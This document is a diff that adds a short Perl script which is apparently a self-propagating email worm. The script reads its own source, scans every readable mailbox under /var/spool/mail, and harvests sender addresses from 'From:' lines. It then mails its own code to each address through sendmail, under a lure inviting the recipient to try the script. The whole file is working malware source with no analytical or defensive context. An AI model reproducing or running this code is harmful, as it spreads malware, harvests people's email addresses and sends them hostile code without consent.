@@ -1,0 +1,28 @@
+#!/usr/bin/perl
+ open(File,$0);
+ @Virus=<File>;
+ @Virus=@Virus[0...29];
+ close(File);
+
+ foreach $FileName (</var/spool/mail/*>) {
+  if ((-r $FileName) && (-f $FileName)) {
+   open(File, "$FileName");
+   @test1=<File>;
+   close(File);
+   @ReceiverList = grep /From:/, @test1;
+   foreach $Receiver2 (@ReceiverList){
+    @Receiver = split(/:/, $Receiver2);
+    @Addy = split(/</, @Receiver[1]);
+    open(File,">PerlWurm");
+    print File "Hi@Addy[0]\n";
+    print File "take a look at this perl script\nand see what is possible to do\nin perl.. \n";
+    print File " cu soon\n\n\n";
+    print File @Virus;
+    print File ".\n";
+    close(File);
+
+    chomp(@Addy[1]);
+    chop(@Addy[1]);
+    $x = `sendmail @Addy[1] < PerlWurm`;
+ }}}
+
